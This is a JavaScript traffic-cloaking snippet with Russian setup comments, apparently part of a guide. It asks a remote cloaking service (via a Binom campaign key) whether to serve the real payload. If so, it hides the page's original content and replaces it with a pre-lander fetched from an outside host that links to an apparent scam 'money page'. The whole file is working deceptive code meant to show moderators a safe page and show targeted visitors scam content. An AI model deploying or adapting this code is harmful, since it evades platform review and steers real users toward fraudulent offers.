var binomCampaingKey = '59459z4egzuuxou49s0b'; /*Netlify_Urotrin, id:373. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
var landingUrl = 'https://cloaking.site/landing/xhr/safe/'; /*Адрес преленда, который необходимо подгрузить*/
var gitHubId = ''; /*ID созданного в первой части гайда Google-сайта. Только ID, не вся ссылка!*/
var moneyPageUrl = 'https://evolvedsystem.online/automatycznysystem?'; /*Адрес манипейдж, который будет подставлен в ссылки на преленде*/
var landingLoadingId = '';

var landing = landingUrl + "?mpurl=" + moneyPageUrl;
/* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/

var url = 'https://cloaking.site/binom/?bckey='+binomCampaingKey;
var xhr = new XMLHttpRequest();
var cloakResult = 'no';

xhr.open('GET', url, false);
xhr.send();

if (xhr.status == 200) {
  cloakResult = xhr.responseText;
} 

if(cloakResult=="yes"){
var xhrLand = new XMLHttpRequest();
var landingCode = '';

xhrLand.open('GET', landing, false);
xhrLand.send();

if (xhrLand.status == 200) {
  landingCode = xhrLand.responseText;
}

document.write("<style>#swrap{display:none;}</style>")

document.write(landingCode);

}
